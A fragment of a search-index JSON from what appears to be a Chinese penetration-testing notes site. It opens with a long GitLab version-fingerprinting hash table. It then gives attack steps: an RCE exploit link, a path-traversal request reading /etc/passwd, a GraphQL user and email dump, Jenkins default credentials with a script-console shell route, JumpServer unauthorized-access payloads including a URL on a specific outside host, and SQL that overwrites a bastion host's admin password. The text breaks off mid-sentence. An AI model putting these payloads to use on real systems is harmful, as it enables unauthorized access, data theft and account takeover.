'gitlab-ce:14.2.0', 'fb363d9a83c6c1b671a8': 'gitlab-ce:9.0.5', 'e448ad0d2ca9cc0ac5b8': 'gitlab-ee:14.0.1', '574f099ee72dbe6b0ced': 'gitlab-ce:9.5.0', '66d111c1f917a9d09e16': 'gitlab-ee:10.5.0,10.5.1', 'c7a1c922a22391b3c091': 'gitlab-ce:10.2.5', '5449545f1e9da9a25940': 'gitlab-ce:13.10.2,13.10.3', 'bbb80152234da762016a': 'gitlab-ce:9.5.4', 'e8df2b4fde206d7d9703': 'gitlab-ce:14.3.1,14.3.2', '8419b3ba4be6e0dc5619': 'gitlab-ee:12.9.0', '2e4f0a5c5e7f44fae7f6': 'gitlab-ce:13.12.2,13.12.3,13.12.4,13.12.5', '350b08a260f8f3c064dc': 'gitlab-ce:14.0.5', 'b490d5b6f11099f930ce': 'gitlab-ee:9.3.1', 'b02bb6cb685b92e79838': 'gitlab-ee:9.2.10,9.2.7,9.2.8,9.2.9', '3c6bb9c7df8acc18d0d7': 'gitlab-ce:11.0.0,11.0.1', '3c526831b656a6d9a00c': 'gitlab-ee:12.7.0', '41e1a02f1d6d950b2807': 'gitlab-ee:12.8.2', 'cf5ad1bb59f3b6be5a31': 'gitlab-ce:12.10.3,12.10.5,12.10.6', '210976fd1a4fadc2a12c': 'gitlab-ee:10.5.7', '8c5e7b20d0f886519b3c': 'gitlab-ee:11.9.10,11.9.11', '721a2812021737baa1d5': 'gitlab-ee:10.3.4,10.3.5', '92643beff62755798491': 'gitlab-ce:11.10.0', '3dc52f008d4b86c267e1': 'gitlab-ce:11.6.9', '8f172df2c323172817a8': 'gitlab-ce:11.4.3,11.4.4', '6b1b04f0c9deb46340e1': 'gitlab-ce:9.2.6', '4aee333c2055f87198a4': 'gitlab-ce:9.1.0,9.1.1,9.1.2', 'dbe16a7eda5d59f26bfb': 'gitlab-ce:10.2.3', 'ab0e7e95f0e854e3f665': 'gitlab-ce:9.2.4,9.2.5', '7c314a5fcb3cc21e81a0': 'gitlab-ee:11.9.12', 'b6be20f5f9bd67f88a0f': 'gitlab-ce:11.5.2,11.5.3,11.5.4,11.5.5', '10e9bf20d006e19bc344': 'gitlab-ce:9.2.1', '5df49875b1117a04d06c': 'gitlab-ce:14.3.0', '358f672c208344332ec8': 'gitlab-ce:14.0.6', '3584b2208695087e93a4': 'gitlab-ce:12.5.0', '57532f8615919c45f89e': 'gitlab-ce:10.7.1', 'ebcc24a2528f0ea9834e': 'gitlab-ce:9.0.0', 'd3141d5c4c9bf41ab730': 'gitlab-ce:11.2.7,11.2.8', '44d5af221f1c528584dc': 'gitlab-ee:14.2.0', 'cc923a667f9c8788713a': 'gitlab-ce:10.7.3,10.7.4,10.7.5,10.7.6,10.7.7', '0f767eb6f90b1292725d': 'gitlab-ce:10.6.4', 'aab56d5d61006e2c4f06': 'gitlab-ce:12.3.7,12.3.8,12.3.9', '5424af9904b84d10f751': 'gitlab-ce:10.1.3', '0ef7415e289409ac5b21': 'gitlab-ce:11.3.10', '5108cc4e3ac2af93dcd7': 'gitlab-ee:14.0.0', '4b10bf74d5ba5e840798': 'gitlab-ce:11.8.1', 'e1eb485b71f87b750a39': 'gitlab-ee:12.3.7,12.3.8,12.3.9', '9e1f84d529c29838a818': 'gitlab-ee:10.6.4', '160c9e9ca72351ddf5c4': 'gitlab-ee:14.1.3,14.1.4,14.1.5,14.1.6', '3b571d7d1f349f7d0dbb': 'gitlab-ce:11.6.8', '33c132122ac56c31a59b': 'gitlab-ce:12.1.3,12.1.4,12.1.6', 'beac23a9af3ddd43fe7a': 'gitlab-ee:13.4.6', '501e0009eb193706ab21': 'gitlab-ce:12.1.11,12.1.8,12.1.9', 'ced00f8574d8f81c9759': 'gitlab-ce:13.2.1', '42544af69d84aa7fbc8c': 'gitlab-ce:12.1.12,12.1.13,12.1.14', 'efd81b42452d67118152': 'gitlab-ee:14.3.3', '6de7741cec9ab7826d5f': 'gitlab-ce:11.11.3', '3ca7b0a55053f7538ef0': 'gitlab-ce:13.3.0,13.3.1', '18a696548203fff9106c': 'gitlab-ee:9.2.3,9.2.4,9.2.5', '23387a7eaad5c6410484': 'gitlab-ce:12.7.2', 'cecc0cc390877fa75276': 'gitlab-ee:10.8.3,10.8.4,10.8.5,10.8.6', '44f76075498ed38a8742': 'gitlab-ee:8.17.6,8.17.7,8.17.8', '166b8859fe47d928e789': 'gitlab-ce:13.5.5,13.5.6,13.5.7', '71b89ad888202c76e5c9': 'gitlab-ee:9.2.0', 'f5af4d74b365f9bf567b': 'gitlab-ee:9.5.6,9.5.7', '9a754492dd90555ca3dd': 'gitlab-ee:9.5.5', 'c21efe070704289b6c55': 'gitlab-ce:10.3.4,10.3.5', 'f6d09bb32d51bbce02db': 'gitlab-ce:11.3.5,11.3.6', '61bfa43f9fb4116abd7f': 'gitlab-ee:13.4.1,13.4.2', '7085fd1d1befa4c549dd': 'gitlab-ee:11.6.0', 'ba57b98387ee424723b9': 'gitlab-ce:12.7.8,12.7.9', 'f249792cbf6dffd76e88': 'gitlab-ee:9.5.3', 'c5d8ab5a701f0778a74d': 'gitlab-ee:13.0.12,13.0.13,13.0.14', '678d000f0569e9c99a0a': 'gitlab-ee:9.4.7', '4acb317a59d20876f907': 'gitlab-ee:13.1.2,13.1.3', '81d7b793252877126df4': 'gitlab-ce:13.7.0,13.7.1,13.7.2', '5d278d6da52671da29ee': 'gitlab-ee:13.8.0', '642a321f00403e0c8400': 'gitlab-ee:9.2.6', '106ffb118b158e8b577a': 'gitlab-ce:13.2.4,13.2.5,13.2.6,13.2.7', 'c99cdb0969be4f0da0fc': 'gitlab-ee:13.11.0', '8d07d7fd07389c4cd403': 'gitlab-ee:10.1.4', '946e25ac96152ee42037': 'gitlab-ee:11.11.1,11.11.2', '6779c5c26004cdef9dbe': 'gitlab-ee:14.0.6', '50b1acc557734feafad9': 'gitlab-ce:11.7.6,11.7.7', '83baaba01ce2dffb286d': 'gitlab-ce:13.2.0', '1a7d8b021aef4c8e0e9b': 'gitlab-ee:11.7.10,11.7.11,11.7.12', '9b57394b4dd929713787': 'gitlab-ce:12.7.0', '012eb4c5de7d7e420bb5': 'gitlab-ee:14.1.7', '5cbc08b3e4827370079f': 'gitlab-ee:10.4.4,10.4.5,10.4.6', '54fd6eb654a74ed0794a': 'gitlab-ce:13.4.4', '7820accd42fb137e2c08': 'gitlab-ee:12.0.12,12.0.8,12.0.9', '37fa755ae908d8e2b743': 'gitlab-ce:10.0.2', '628217d9d243ab844ac4': 'gitlab-ee:10.6.0', 'd879f635d99b01660a52': 'gitlab-ce:11.5.10,11.5.11', 'f5934f39051d7dfba134': 'gitlab-ee:14.2.3,14.2.4', '9c5f00c44ae3caefc02e': 'gitlab-ce:13.3.9', '99d9e425f254524ad8ac': 'gitlab-ce:12.9.1,12.9.2,12.9.3', '4a996fd00928b5e20c08': 'gitlab-ce:11.10.1,11.10.2,11.10.3', '547403af54903a5effc0': 'gitlab-ce:12.2.6,12.2.7,12.2.8', '7f972b6af093c93ab7b8': 'gitlab-ce:10.4.3', 'f75bbb61dcafe004df55': 'gitlab-ce:11.4.6,11.4.7', '5813a74c5cb3461fb723': 'gitlab-ee:13.1.6,13.1.7,13.1.8,13.1.9', 'eda1474489f61ee4bea7': 'gitlab-ee:13.2.10,13.2.8,13.2.9', 'dceb595db940ed48486f': 'gitlab-ce:12.4.4,12.4.5,12.4.6,12.4.7,12.4.8', '43efb4910cfe25e5ec41': 'gitlab-ee:11.10.7,11.10.8', 'd77871d1c9d6f0ad46eb': 'gitlab-ee:10.8.0', '9929e90eac444bca7baf': 'gitlab-ee:13.5.4', '74ec7b78d2e1e787307e': 'gitlab-ee:13.0.1', 'd1a22dece9584fefa298': 'gitlab-ce:14.1.2,14.1.3,14.1.4,14.1.5,14.1.6', 'c3a338ef4a097af48d5f': 'gitlab-ce:11.10.7,11.10.8', 'e029cc1403581d179eb4': 'gitlab-ce:10.7.0', 'feb8ac93f4cd519f7b74': 'gitlab-ee:9.5.0', '36987894604114b89659': 'gitlab-ce:11.7.0', 'bb2f8670798f7b168aea': 'gitlab-ce:9.5.10,9.5.9', 'd82cb00d39d43a109c20': 'gitlab-ee:13.1.10,13.1.11', '07f31ac63f997f05ed88': 'gitlab-ee:12.9.10,12.9.8,12.9.9', 'e16093b3fa8d4dfcb7f1': 'gitlab-ce:13.6.6,13.6.7', 'a131ccca4742d65cc7c8': 'gitlab-ce:11.0.5', '37f15d1add4c81283440': 'gitlab-ee:9.4.2,9.4.3,9.4.4', '1ca2c636c594fe82bf56': 'gitlab-ce:11.2.4,11.2.5', '648db5972bf0c4d01204': 'gitlab-ee:13.11.1,13.11.2,13.11.3,13.11.4', '80ac6c940306abbf40f4': 'gitlab-ce:11.8.2,11.8.3', 'ca3e2a954495cefa4560': 'gitlab-ce:11.3.3,11.3.4', 'e606e589cfd00283243d': 'gitlab-ee:12.7.2', '70e95d96945ac6b116df': 'gitlab-ce:13.10.5', 'cc508781720881b7f734': 'gitlab-ee:14.3.2', 'fa2051e535b5d468e50b': 'gitlab-ee:12.9.2,12.9.3', '2049fe2d430650c71460': 'gitlab-ce:9.4.0', 'cf9ab010a484fb41f674': 'gitlab-ee:12.3.6', '7e1da6442d2055f08435': 'gitlab-ee:13.10.4', 'd9036dfe13b24443d785': 'gitlab-ee:13.7.8,13.7.9', '503ca1b16238be618bf4': 'gitlab-ce:10.6.5,10.6.6', '8285d779049273968838': 'gitlab-ee:12.2.12,12.2.9', '5da97d0d735d667d16ce': 'gitlab-ce:14.2.3,14.2.4', '1cb94ba8a99fd37f717d': 'gitlab-ee:10.8.1', '130b56192be1d80b4cbd': 'gitlab-ee:13.4.3', '0de1e45bd411cb834ba5': 'gitlab-ee:10.1.3', 'ee5853b8ee4e0bc5dd41': 'gitlab-ee:12.1.11,12.1.8,12.1.9', '5315913351938d1b23a1': 'gitlab-ce:12.7.4,12.7.5,12.7.6', '2f0c802bb92185c21103': 'gitlab-ee:13.7.5', 'e6ba80a46952a6c16174': 'gitlab-ee:13.12.10,13.12.11,13.12.12,13.12.9', '4609b7e979b6c9009788': 'gitlab-ee:10.4.3', '5813eb8693da59ff0841': 'gitlab-ce:9.5.8', '025f157da404339a9c7b': 'gitlab-ce:12.3.2,12.3.3,12.3.4,12.3.5', '95042a74fd2ec393495d': 'gitlab-ee:13.9.1', 'e98fdb2c980f721788c6': 'gitlab-ce:9.2.10,9.2.7,9.2.8,9.2.9', '212e0d5aa9a2d3a51757': 'gitlab-ce:13.11.5', '081c2571938dd458a7aa': 'gitlab-ee:11.0.3,11.0.4', 'cb33673c46de2f1007de': 'gitlab-ee:13.3.2,13.3.3', 'e7f82b26132cf2c8cfbc': 'gitlab-ce:13.1.2,13.1.3,13.1.4,13.1.5,13.1.6', '6bdcd98ef34512d3939c': 'gitlab-ce:13.5.2', '1739df9627dc4fb80595': 'gitlab-ee:11.4.13,11.4.14', '7909f26d68264418c7c5': 'gitlab-ce:13.9.2,13.9.3,13.9.4,13.9.5,13.9.6', '5bb7d410b4c93ad7c5ab': 'gitlab-ee:12.0.0,12.0.1', 'e714554e56ca340231be': 'gitlab-ee:11.0.0,11.0.1', '04a7f5f3870b6f39e85c': 'gitlab-ee:10.1.0', 'b5a47617861a7a8e462a': 'gitlab-ee:12.2.1', 'b965bdb5d866fc45b55d': 'gitlab-ee:9.3.11', '7078cefb7511b0b6b76b': 'gitlab-ee:13.3.6,13.3.7,13.3.8', '3c20f7378305186b3f3d': 'gitlab-ee:10.1.6,10.1.7', 'ad6d7ff474c1014090c9': 'gitlab-ee:9.4.6', 'e1e70cc562bf80739c3b': 'gitlab-ee:11.4.0', 'ed47566e9facd76f4aaa': 'gitlab-ee:13.0.3,13.0.4,13.0.5,13.0.6,13.0.7', 'd901a5d41079d7c7396b': 'gitlab-ce:12.4.2,12.4.3', 'c43a7068c3610a3c7e3e': 'gitlab-ee:11.8.10,11.8.8,11.8.9', '22de812373910f0bc00e': 'gitlab-ce:14.0.3,14.0.4', 'df0a9d7641c58f311bad': 'gitlab-ee:13.9.7', '35fc8c44bd461d78a912': 'gitlab-ce:14.2.6', '735e7997e4e8c754817b': 'gitlab-ce:11.6.10,11.6.11', '9fcecf859d07d168fae0': 'gitlab-ee:13.0.0', '384e8af9b8600f189bd4': 'gitlab-ee:14.0.10,14.0.11,14.0.12,14.0.8,14.0.9', '5b4c75fdc1b11701842c': 'gitlab-ee:11.10.6', '77af7230263c2fcb6604': 'gitlab-ee:13.10.2,13.10.3', '089df064522a3db89c72': 'gitlab-ee:10.5.4,10.5.5,10.5.6', '22a1b3acd211ee8cd6de': 'gitlab-ee:10.7.2', 'fd241a0fc16ea6d73251': 'gitlab-ee:12.6.0,12.6.1,12.6.2,12.6.3,12.6.4', '336d89b2fce2ef0d5988': 'gitlab-ce:8.17.1', '15d3fe09016988c71054': 'gitlab-ce:10.8.1,10.8.2', '3c8eec19d3f1ac95dbb7': 'gitlab-ce:11.5.1', 'd56024b86de2d0594747': 'gitlab-ce:13.11.1,13.11.2', 'bdc7e362e71a48fff678': 'gitlab-ee:11.5.1', 'c2a4aca3c1d4c85aff7e': 'gitlab-ee:13.2.2', 'ac7d7edb09babfd68fed': 'gitlab-ee:9.0.0', 'b67caf307ffa329b1fc5': 'gitlab-ce:12.2.0', '5a40b9fdbf741f7fcd6e': 'gitlab-ee:14.0.2', '576195e375ef7c4c8f65': 'gitlab-ee:12.3.2,12.3.3', '5c8af130cec9e511ece1': 'gitlab-ee:10.0.0,10.0.1', 'b80182009e358942eeef': 'gitlab-ee:12.3.4,12.3.5', 'fe923c5e0b6a8e70acec': 'gitlab-ee:10.7.0', '115475130651e41cfa85': 'gitlab-ee:11.10.4', 'cad92852d179e1c7e0f4': 'gitlab-ee:11.5.2,11.5.3,11.5.4,11.5.5', '17d31e96556327e11216': 'gitlab-ce:11.8.6,11.8.7', '702358cf2bb37bf1a127': 'gitlab-ce:10.2.4', 'b6845dc4fa21eaa5a7a6': 'gitlab-ce:14.2.1,14.2.2', '7344c61b3d57a00a7076': 'gitlab-ce:8.17.0', '5d4b59870d47e28f402e': 'gitlab-ce:10.8.3,10.8.4,10.8.5,10.8.6', '86112533e233a363c04f': 'gitlab-ee:14.3.4', '3607f9e278e03f25bb7e': 'gitlab-ce:9.5.6,9.5.7', '8903ba9503bbfb0a4b69': 'gitlab-ce:11.1.2', '3b9f73d36eecedcfa09e': 'gitlab-ee:10.8.2', 'b9dcc0f1e5de99c34da8': 'gitlab-ce:10.4.2', 'c3d908474f861434ea34': 'gitlab-ee:14.0.7', '9f4cd9b2c7ce6f3b32ed': 'gitlab-ce:14.0.0,14.0.1', 'a58e760c263ce457a2ff': 'gitlab-ee:11.6.2,11.6.3,11.6.4', '0c150549bb110fe3fa98': 'gitlab-ee:13.7.6,13.7.7', 'c0d4120f45bd7c957637': 'gitlab-ce:13.4.5', '02bb16d60cbc4c38dba3': 'gitlab-ee:9.2.1', '3be73f0e686cf6357ff9': 'gitlab-ce:9.4.1', 'b74c7a098526bd6e442e': 'gitlab-ee:13.7.0', '85724630376db8be1a3f': 'gitlab-ce:12.0.12,12.0.8,12.0.9', 'b3f74fcf7a94aa8fd0e0': 'gitlab-ce:9.3.0', 'fea70c983bd4bb950a59': 'gitlab-ce:14.3.4', '25931ced49555567dc55': 'gitlab-ee:10.1.1,10.1.2', '8994b6009115587ea326': 'gitlab-ee:11.10.0', '75cdd56ce4873d3ae586': 'gitlab-ce:13.7.6,13.7.7', '154a62ac46073b1ebee9': 'gitlab-ce:13.2.2,13.2.3', 'f8fed774b90576098c94': 'gitlab-ce:13.0.13,13.0.14', 'eaff05292dbb12ad6d31': 'gitlab-ce:10.2.2', '8a8ea90e88c20bd388df': 'gitlab-ee:10.2.4', '811a551d157f5cf3283d': 'gitlab-ee:11.5.0', 'f759e4ab23039521a343': 'gitlab-ce:14.0.2', 'eebb6ffc30262a5078b3': 'gitlab-ce:11.8.0', 'bda24e7d200a0d34003a': 'gitlab-ce:14.4.1', '3cb651b9ded78ec5e5e8': 'gitlab-ce:13.2.10,13.2.8,13.2.9', 'eef5733506c0541a30f0': 'gitlab-ee:13.6.2', '81aa1e56d2fb8acf7277': 'gitlab-ee:11.1.8', '0bc42faf2609435ffbf4': 'gitlab-ce:13.5.4', '7d43d98529c63f480c16': 'gitlab-ee:10.4.2', '37f3e84421676e355f10': 'gitlab-ee:11.4.6,11.4.7', '2559aed68d9d56d1167c': 'gitlab-ee:10.2.0,10.2.1', '1b8960c60d4896e63703': 'gitlab-ee:10.6.1,10.6.2', '28d61c9e7037a42038fd': 'gitlab-ce:11.3.0', '6063770121a571b50b9c': 'gitlab-ce:10.8.0', '07992a31648e423d2af5': 'gitlab-ee:13.1.0', '3a4197b5cf122f8b18dc': 'gitlab-ce:9.4.6', 'ddd3a0be6b0ef6faafba': 'gitlab-ee:14.2.5', '11ab845be93eaa129e78': 'gitlab-ce:13.12.15', 'ec82707d3f866dccac8b': 'gitlab-ee:12.1.12,12.1.13,12.1.14', '188cfd4384893f602a52': 'gitlab-ce:12.6.6,12.6.7', '9904d8fe3c76ea5f06c2': 'gitlab-ee:9.1.3', '119207c3a8cd87829aed': 'gitlab-ce:11.3.1', '34bf988d7fb3e4cc9f5d': 'gitlab-ce:12.8.10,12.8.8,12.8.9', '938cde10cd954dce9da4': 'gitlab-ee:11.8.6,11.8.7', 'd34961b09e0af5e13343': 'gitlab-ee:14.3.1', '9902887db5eb0f6cd8f3': 'gitlab-ee:12.6.8', 'ec83461c3c19168a84d3': 'gitlab-ee:12.10.13,12.10.14', '4e897e63a1d32f275e11': 'gitlab-ce:13.6.1', 'ea44719dddf278352f86': 'gitlab-ce:11.11.4,11.11.5,11.11.7,11.11.8', '456afae5ce71676911dc': 'gitlab-ce:12.1.17', '67d91be12601337315f7': 'gitlab-ee:9.0.5', '4301f7448383b685c49b': 'gitlab-ee:11.1.6,11.1.7', 'f8534f1afb04c25ed3f4': 'gitlab-ce:11.6.0', '38dfb5756945cea3dd27': 'gitlab-ce:11.9.10,11.9.11,11.9.12,11.9.6,11.9.7,11.9.8,11.9.9', 'ef0c3cfbbd3e3a8a2534': 'gitlab-ce:13.8.2,13.8.3,13.8.4', 'c9bf991cf2beb5e62667': 'gitlab-ce:13.1.0', 'bccc7be0f9c03b70a5e6': 'gitlab-ee:13.12.0', '7d8865fbde7c8d493e84': 'gitlab-ee:13.5.0', '633c38f22c8f88b9fb4a': 'gitlab-ce:10.0.3', '9942f645172a41c8335e': 'gitlab-ce:9.0.6', '3a2b35098114d9119d97': 'gitlab-ee:10.6.3', '430458ad60fc069ac5d1': 'gitlab-ce:12.8.5,12.8.6,12.8.7', 'c89dcfd86eaf9551f4a3': 'gitlab-ce:11.5.0', '847fa0453327f8669000': 'gitlab-ee:13.4.0', '21d4dda00a24a446bf7f': 'gitlab-ee:9.0.6', '32db020b9d43b8a50037': 'gitlab-ce:13.6.3,13.6.4,13.6.5', '2775dff9deb7b37bdfa6': 'gitlab-ee:11.3.11,11.3.12,11.3.13,11.3.14', '314ae155c8f6f953adb6': 'gitlab-ee:10.0.2', 'c20a1cbee3c383bf9f14': 'gitlab-ee:12.8.5,12.8.6,12.8.7', 'd558d95b4804ac8fbf40': 'gitlab-ee:10.2.6,10.2.7,10.2.8', '704928cb41c2f94b9b1d': 'gitlab-ce:13.12.10,13.12.11,13.12.12,13.12.9', '30b3667b4d41d8ce44a3': 'gitlab-ce:11.1.4', 'e267a4db225588f8c11e': 'gitlab-ce:9.0.1,9.0.2', 'cc42e9b802eeaf94293c': 'gitlab-ee:13.1.4,13.1.5', '9c23f762b77db429339a': 'gitlab-ce:11.11.0,11.11.1,11.11.2', '1dae310d8bfeeebafe86': 'gitlab-ce:12.3.6', 'c5eb5be9bee6be3c4538': 'gitlab-ce:9.4.5', '8d2b0f1ff095accfc367': 'gitlab-ce:14.2.5', '07cc1fe08ad7d1332e64': 'gitlab-ce:12.6.0,12.6.1,12.6.2,12.6.3,12.6.4', 'ff4684701a85b37f55d8': 'gitlab-ee:13.12.6,13.12.7,13.12.8', '74f24f2f5b4497a29ea4': 'gitlab-ee:11.1.4', 'd49d67df80246079a30c': 'gitlab-ce:14.4.0', 'e84d29ce2b8b7cfcef2e': 'gitlab-ce:10.0.5,10.0.6', 'e823053a3d100e86d493': 'gitlab-ee:13.2.0', '0218bf32825db6f0dd65': 'gitlab-ce:13.0.1', '58c006356a35c0a6e32d': 'gitlab-ee:11.5.10,11.5.11', '272581befe0e90303fef': 'gitlab-ee:8.17.2', '8d7e1919dabad9366801': 'gitlab-ee:13.12.15', 'c7d8acb11d3c82f6e711': 'gitlab-ee:12.4.0,12.4.1', '6a10102fa6ffbd556c1f': 'gitlab-ee:13.5.3', 'fd874117abfe342520d1': 'gitlab-ee:9.3.0',","title":"\u7248\u672c-json\u6587\u4ef6\u68c0\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/gitlab/gitlab/#_3","text":"","title":"\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/gitlab/gitlab/#gitlabrcecve-2021-22205","text":"\u5f71\u54cd\u7248\u672c 11.9 <= Gitlab CE/EE < 13.8.813.9 <= Gitlab CE/EE < 13.9.613.10 <= Gitlab CE/EE < 13.10.3 https://github.com/Al1ex/CVE-2021-22205","title":"gitlab\u672a\u6388\u6743RCE\uff08CVE-2021-22205\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/gitlab/gitlab/#_4","text":"\u53ef\u80fd\u9700\u8981\u767b\u5f55 GET /group1/group2/group3/group4/group5/group6/group7/group8/group9/project9/uploads/4e02c376ac758e162ec674399741e38d//..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","title":"\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/gitlab/gitlab/#_5","text":"/explore/projects","title":"\u672a\u6388\u6743\u6d4f\u89c8\u9879\u76ee"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/gitlab/gitlab/#_6","text":"GitLab 13.4 - 13.6.2 POST /api/graphql HTTP/1.1 Host: Content-Length: 212 Content-Type: application/json {\"query\":\"{\\nusers {\\nedges {\\n node {\\n username\\n email\\n avatarUrl\\n status {\\n emoji\\n message\\n messageHtml\\n }\\n }\\n }\\n }\\n }\",\"variables\":null,\"operationName\":null}","title":"\u90ae\u4ef6\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jenkins/jenkins/","text":"jenkins \u76ee\u5f55 \u672a\u6388\u6743 \u5f31\u53e3\u4ee4 \u540e\u53f0rce \u672a\u6388\u6743 \u6709\u4e9b\u65f6\u5019jekins\u53ef\u4ee5\u76f4\u63a5\u8fdb\u3002\u6216\u8005\u53ef\u4ee5\u6ce8\u518c\u4e5f\u53ef\u4ee5\u8fdb\u540e\u53f0 \u5f31\u53e3\u4ee4 jenkins\u5b58\u5728\u9ed8\u8ba4\u53e3\u4ee4\u4f7f\u7528\u5f31\u53e3\u4ee4\u767b\u5f55 admin/admin123 \u540e\u53f0rce \u7cfb\u7edf\u7ba1\u7406\u2192\u811a\u672c\u63a7\u5236\u53f0 \u53ef\u4ee5\u5b89\u88c5\u63d2\u4ef6Terminal Plugin\u6765\u62ffshell\uff0c\u5c31\u514d\u53bb\u4e86\u53cd\u5f39shell\u7684\u6b65\u9aa4","title":"jenkins"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jenkins/jenkins/#jenkins","text":"","title":"jenkins"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jenkins/jenkins/#_1","text":"\u672a\u6388\u6743 \u5f31\u53e3\u4ee4 \u540e\u53f0rce","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jenkins/jenkins/#_2","text":"\u6709\u4e9b\u65f6\u5019jekins\u53ef\u4ee5\u76f4\u63a5\u8fdb\u3002\u6216\u8005\u53ef\u4ee5\u6ce8\u518c\u4e5f\u53ef\u4ee5\u8fdb\u540e\u53f0","title":"\u672a\u6388\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jenkins/jenkins/#_3","text":"jenkins\u5b58\u5728\u9ed8\u8ba4\u53e3\u4ee4\u4f7f\u7528\u5f31\u53e3\u4ee4\u767b\u5f55 admin/admin123","title":"\u5f31\u53e3\u4ee4"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jenkins/jenkins/#rce","text":"\u7cfb\u7edf\u7ba1\u7406\u2192\u811a\u672c\u63a7\u5236\u53f0 \u53ef\u4ee5\u5b89\u88c5\u63d2\u4ef6Terminal Plugin\u6765\u62ffshell\uff0c\u5c31\u514d\u53bb\u4e86\u53cd\u5f39shell\u7684\u6b65\u9aa4","title":"\u540e\u53f0rce"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/jumpserver%E5%A0%A1%E5%9E%92%E6%9C%BA/","text":"jumpserver\u5821\u5792\u673a \u76ee\u5f55 \u6e17\u900f rce \u672a\u6388\u6743\u8bbf\u95ee \u540e\u6e17\u900f \u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6 \u6539\u6570\u636e\u5e93\u8fdbweb \u6258\u7ba1\u673a\u5668\u7684\u8d26\u6237\u5bc6\u7801\u83b7\u53d6 mfa\u64cd\u4f5c \u67e5\u770b\u8fd0\u7ef4\u8bb0\u5f55 \u5f00\u6e90\u5821\u5792\u673a \u6e17\u900f rce JumpServer < v2.6.2 JumpServer < v2.5.4 JumpServer < v2.4.5 JumpServer = v1.5.9 https://github.com/Veraxy00/Jumpserver-EXP \u672a\u6388\u6743\u8bbf\u95ee 3.0.0 <= JumpServer <= 3.6.3 \u76ee\u524d\u5404\u5927CERT\u7ed9\u51fa\u7684payload\u662f /api/v1/terminal/sessions/ \u6216/api/v1/terminal/sessions/?limit=1\u6216 /api/v1/terminal/sessions.json?limit=1 \u7136\u540e\u5c31\u53ef\u4ee5\u4e0b\u8f7d\u89c6\u9891\u6587\u4ef6\uff08\u4e0d\u786e\u5b9a\u8be5payload\u662f\u5426\u6709\u6548\uff09 http://soho1.physis.com.cn:8600/media/xpack/../replay/2023-09-21/a7cf55c5-8d72-49e7-943c-486fed057047.cast.gz \u540e\u6e17\u900f \u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6 https://docs.jumpserver.org/zh/master/admin-guide/env/ \u914d\u7f6e\u6587\u4ef6\u53c2\u6570\u5217\u8868 vi /opt/jumpserver/config/config.txt \u6539\u6570\u636e\u5e93\u8fdbweb hash\u65e0\u6cd5\u89e3\u5bc6\uff0c\u56e0\u4e3a\u88ab\u591a\u6b21hash #\u67e5\u770b\u7528\u6237\u8868 selelct * from users_user; #\u5907\u4efd\u539f\u59cb\u5bc6\u7801 select password from users_user where username='admin' #\u66ff\u6362\u5bc6\u6587\u4e3ayyds@1234 update users_user set password='pbkdf2_sha256$260000$OcZu99PdSdBwb7cqNHB778$kg8kDAcG24M0baJat3O/uX1IxTFWXtJGfbalY+7Pj84=' where username='admin' \u5982\u679c\u5f00\u542f\u4e86mfa\u4e8c\u6b21\u8ba4\u8bc1\uff0c\u5219\u9700\u8981\u7ed5\u8fc7\uff0c\u540e\u6587\u4f1a\u8c08\u53ca \u6258\u7ba1\u673a\u5668\u7684\u8d26\u6237\u5bc6\u7801\u83b7\u53d6 \u524d\u63d0\u9700\u8981 